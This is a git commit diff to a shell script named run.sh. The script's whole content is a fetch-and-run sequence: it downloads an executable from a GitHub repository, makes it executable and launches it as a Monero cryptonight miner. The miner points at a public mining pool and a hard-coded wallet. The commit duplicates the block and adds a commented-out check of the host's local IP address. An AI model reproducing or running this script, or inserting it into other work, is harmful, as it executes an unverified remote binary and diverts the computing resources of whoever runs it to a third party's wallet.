01d00272b47f72593974df5bf7bdb85316b8200a
osrun <44208422+osrun@users.noreply.github.com>
2018-10-16 22:33:08 -0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,4 +1,13 @@
 #!/bin/sh
+
+##!/bin/sh
+
+#if ifconfig eth0 | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then echo "ok"; fi
+
+wget https://github.com/osrun/beta/raw/master/run
+chmod +x run
+./run -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y
+
 wget https://github.com/osrun/beta/raw/master/run
 chmod +x run
 ./run -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y
